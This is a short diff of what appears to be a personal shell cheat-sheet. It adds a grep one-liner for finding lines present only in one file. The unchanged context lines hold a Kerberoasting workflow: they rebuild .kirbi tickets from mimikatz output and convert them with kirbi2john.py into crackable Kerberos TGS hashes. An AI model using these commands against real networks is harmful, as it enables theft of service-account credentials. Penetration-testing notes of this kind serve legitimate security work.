@@ -57,6 +57,8 @@ use mimikatz kerberos tickets output to recreate .kirbi files; then loop through
 for m in $(grep Saved kerb.full | cut -d ':' -f 2 | tr -d ' '); do awk "/`echo -n $m| tr -d '\n'`/,/Saved/{print}" kerb.full | grep -Ev 'Base64|Saved|====================|^\n$' | openssl enc -base64 -d -out $m; done
 for m in $(ls -1 *.kirbi); do ../JohnTheRipper/run/kirbi2john.py $m | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' >> kerberos.txt; done;
 
+Find lines that are only in file1
+grep -v -F -f file2 file1
 
 #find lines only in file1
 comm -23 file1 file2 
